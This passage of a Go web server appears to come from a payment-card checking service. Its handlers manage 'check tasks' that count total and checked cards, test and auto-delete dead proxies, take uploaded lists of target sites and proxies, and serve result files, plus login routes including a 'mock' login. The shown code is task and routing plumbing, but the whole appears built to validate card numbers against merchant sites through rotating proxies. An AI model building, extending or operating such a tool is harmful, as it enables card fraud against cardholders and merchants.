	var wg sync.WaitGroup
	sem := make(chan struct{}, 20) // Test up to 20 proxies concurrently

	for i, proxy := range proxies {
		wg.Add(1)
		go func(idx int, p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			lat, err := testProxy(p)
			if err != nil {
				results[idx] = TestResult{
					Proxy: p,
					Status: "dead",
					Error: err.Error(),
				}
				GetProxyManager().RecordResult(p, 0, false)
				deleteProxyGlobally(p) // Auto-delete dead proxy
			} else {
				results[idx] = TestResult{
					Proxy: p,
					Status: "alive",
					LatencyMs: lat.Milliseconds(),
				}
				GetProxyManager().RecordResult(p, lat, true)
			}
		}(i, proxy)
	}

	wg.Wait()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"results": results,
	})
}

func apiTasksActiveHandler(w http.ResponseWriter, r *http.Request) {
	userID, _, _ := getSessionUser(r)
	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var taskID int
	var status string
	var totalCards int
	var checkedCards int
	var resultsJSON string
	var createdAt time.Time

	err := db.QueryRow(`
		SELECT id, status, total_cards, checked_cards, results::text, created_at
		FROM check_tasks
		WHERE user_id = $1 AND status = 'running'
		ORDER BY id DESC
		LIMIT 1
	`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)

	if err == sql.ErrNoRows {
		err = db.QueryRow(`
			SELECT id, status, total_cards, checked_cards, results::text, created_at
			FROM check_tasks
			WHERE user_id = $1
			ORDER BY id DESC
			LIMIT 1
		`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)
	}

	w.Header().Set("Content-Type", "application/json")
	if err != nil {
		if err == sql.ErrNoRows {
			json.NewEncoder(w).Encode(map[string]interface{}{"active": false})
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	var results []CheckResult
	if resultsJSON != "" {
		_ = json.Unmarshal([]byte(resultsJSON), &results)
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"active": true,
		"task": map[string]interface{}{
			"id":            taskID,
			"status":        status,
			"total_cards":   totalCards,
			"checked_cards": checkedCards,
			"results":       results,
			"created_at":    createdAt,
		},
	})
}

func apiTasksDetailsHandler(w http.ResponseWriter, r *http.Request) {
	taskIDStr := r.URL.Query().Get("id")
	if taskIDStr == "" {
		http.Error(w, "Task ID is required", http.StatusBadRequest)
		return
	}
	taskID, err := strconv.Atoi(taskIDStr)
	if err != nil {
		http.Error(w, "Invalid Task ID", http.StatusBadRequest)
		return
	}

	userID, _, isAdmin := getSessionUser(r)
	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var tUserID int64
	var status string
	var totalCards int
	var checkedCards int
	var resultsJSON string
	var createdAt time.Time

	err = db.QueryRow(`
		SELECT user_id, status, total_cards, checked_cards, results::text, created_at
		FROM check_tasks
		WHERE id = $1
	`, taskID).Scan(&tUserID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)

	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Task not found", http.StatusNotFound)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	if tUserID != userID && !isAdmin {
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	var results []CheckResult
	if resultsJSON != "" {
		_ = json.Unmarshal([]byte(resultsJSON), &results)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":            taskID,
		"status":        status,
		"total_cards":   totalCards,
		"checked_cards": checkedCards,
		"results":       results,
		"created_at":    createdAt,
	})
}

func apiTasksCancelHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	taskIDStr := r.URL.Query().Get("id")
	if taskIDStr == "" {
		var reqData struct {
			ID int `json:"id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&reqData); err == nil && reqData.ID > 0 {
			taskIDStr = strconv.Itoa(reqData.ID)
		}
	}
	if taskIDStr == "" {
		http.Error(w, "Task ID is required", http.StatusBadRequest)
		return
	}
	taskID, err := strconv.Atoi(taskIDStr)
	if err != nil {
		http.Error(w, "Invalid Task ID", http.StatusBadRequest)
		return
	}

	userID, _, isAdmin := getSessionUser(r)
	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var tUserID int64
	var status string
	err = db.QueryRow("SELECT user_id, status FROM check_tasks WHERE id = $1", taskID).Scan(&tUserID, &status)
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Task not found", http.StatusNotFound)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	if tUserID != userID && !isAdmin {
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	if status == "running" {
		activeTasksMu.Lock()
		cancel, exists := activeTasks[taskID]
		activeTasksMu.Unlock()

		if exists && cancel != nil {
			cancel()
		}

		_, _ = db.Exec("UPDATE check_tasks SET status = 'cancelled', updated_at = CURRENT_TIMESTAMP WHERE id = $1", taskID)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiTasksClearHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	taskIDStr := r.URL.Query().Get("id")
	if taskIDStr == "" {
		var reqData struct {
			ID int `json:"id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&reqData); err == nil && reqData.ID > 0 {
			taskIDStr = strconv.Itoa(reqData.ID)
		}
	}
	if taskIDStr == "" {
		http.Error(w, "Task ID is required", http.StatusBadRequest)
		return
	}
	taskID, err := strconv.Atoi(taskIDStr)
	if err != nil {
		http.Error(w, "Invalid Task ID", http.StatusBadRequest)
		return
	}

	userID, _, isAdmin := getSessionUser(r)
	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var tUserID int64
	var resultFilePath sql.NullString
	err = db.QueryRow("SELECT user_id, result_file_path FROM check_tasks WHERE id = $1", taskID).Scan(&tUserID, &resultFilePath)
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Task not found", http.StatusNotFound)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	if tUserID != userID && !isAdmin {
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	if resultFilePath.Valid && resultFilePath.String != "" {
		_ = os.Remove(resultFilePath.String)
	}

	_, err = db.Exec("DELETE FROM check_tasks WHERE id = $1", taskID)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
}

func apiTasksDownloadHandler(w http.ResponseWriter, r *http.Request) {
	taskIDStr := r.URL.Query().Get("id")
	if taskIDStr == "" {
		http.Error(w, "Task ID is required", http.StatusBadRequest)
		return
	}
	taskID, err := strconv.Atoi(taskIDStr)
	if err != nil {
		http.Error(w, "Invalid Task ID", http.StatusBadRequest)
		return
	}

	userID, _, isAdmin := getSessionUser(r)
	if db == nil {
		http.Error(w, "Database connection not available", http.StatusInternalServerError)
		return
	}

	var tUserID int64
	var filePathVal sql.NullString
	err = db.QueryRow("SELECT user_id, result_file_path FROM check_tasks WHERE id = $1", taskID).Scan(&tUserID, &filePathVal)
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "Task not found", http.StatusNotFound)
		} else {
			http.Error(w, err.Error(), http.StatusInternalServerError)
		}
		return
	}

	if tUserID != userID && !isAdmin {
		http.Error(w, "Access denied", http.StatusForbidden)
		return
	}

	if !filePathVal.Valid || filePathVal.String == "" {
		http.Error(w, "Result file not found or task not completed yet", http.StatusNotFound)
		return
	}

	filePath := filePathVal.String
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, "Result file has expired and been deleted (24h retention)", http.StatusGone)
		return
	}

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(filePath)))
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	http.ServeFile(w, r, filePath)
}

func main() {
	loadDotEnv()
	initDB()

	os.MkdirAll(DATA_DIR, 0755)
	os.MkdirAll("data/results", 0755)
	startResultCleanupTimer()

	mux := http.NewServeMux()


	// Serve React compiled static assets
	assetsFS := http.FileServer(http.Dir("frontend/dist"))
	mux.Handle("/assets/", assetsFS)
	mux.HandleFunc("/favicon.svg", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "frontend/dist/favicon.svg")
	})

	mux.HandleFunc("/", requireLogin(indexHandler))
	mux.HandleFunc("/login", requireLogin(loginHandler))
	mux.HandleFunc("/vanlinh", requireLogin(vanlinhHandler))

	mux.HandleFunc("/api/login/admin", apiLoginAdminHandler)
	mux.HandleFunc("/api/login/telegram", apiLoginTelegramHandler)
	mux.HandleFunc("/api/login/mock", apiLoginMockHandler)
	mux.HandleFunc("/api/login/token", apiLoginTokenHandler)
	mux.HandleFunc("/logout", logoutHandler)

	mux.HandleFunc("/api/stats", apiStatsHandler)
	mux.HandleFunc("/api/check_batch", requireLogin(apiCheckBatchHandler))
	mux.HandleFunc("/api/check/start", requireLogin(apiCheckStartHandler))
	mux.HandleFunc("/api/check", requireLogin(apiCheckHandler))
	mux.HandleFunc("/api/check/upload", requireLogin(apiCheckUploadHandler))
	mux.HandleFunc("/api/ws", wsHandler)
	mux.HandleFunc("/api/proxies/test", requireLogin(apiProxiesTestHandler))
	
	mux.HandleFunc("/api/tasks/active", requireLogin(apiTasksActiveHandler))
	mux.HandleFunc("/api/tasks/details", requireLogin(apiTasksDetailsHandler))
	mux.HandleFunc("/api/tasks/cancel", requireLogin(apiTasksCancelHandler))
	mux.HandleFunc("/api/tasks/clear", requireLogin(apiTasksClearHandler))
	mux.HandleFunc("/api/tasks/download", requireLogin(apiTasksDownloadHandler))

	mux.HandleFunc("/api/sites/upload", requireLogin(apiUploadSitesHandler))
	mux.HandleFunc("/api/proxies/upload", requireLogin(apiUploadProxiesHandler))
	mux.HandleFunc("/api/sites/clear", requireLogin(apiClearSitesHandler))
	mux.HandleFunc("/api/proxies/clear", requireLogin(apiClearProxiesHandler))

	mux.HandleFunc("/api/admin/db_info", requireLogin(requireAdmin(apiAdminDBInfoHandler)))
	mux.HandleFunc("/api/admin/site/add", requireLogin(requireAdmin(apiAdminAddSiteHandler)))
	mux.HandleFunc("/api/admin/site/delete", requireLogin(requireAdmin(apiAdminDeleteSiteHandler)))
	mux.HandleFunc("/api/admin/proxy/add", requireLogin(requireAdmin(apiAdminAddProxyHandler)))
	mux.HandleFunc("/api/admin/proxy/delete", requireLogin(requireAdmin(apiAdminDeleteProxyHandler)))
	mux.HandleFunc("/api/admin/site/upload", requireLogin(requireAdmin(apiAdminUploadSitesHandler)))
	mux.HandleFunc("/api/admin/site/clear", requireLogin(requireAdmin(apiAdminClearSitesHandler)))
	mux.HandleFunc("/api/admin/proxy/upload", requireLogin(requireAdmin(apiAdminUploadProxiesHandler)))
	mux.HandleFunc("/api/admin/proxy/clear", requireLogin(requireAdmin(apiAdminClearProxiesHandler)))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8000"
	}

	log.Printf("Server starting on http://0.0.0.0:%s", port)
	if err := http.ListenAndServe("0.0.0.0:"+port, mux); err != nil {
		log.Fatal(err)
	}
}
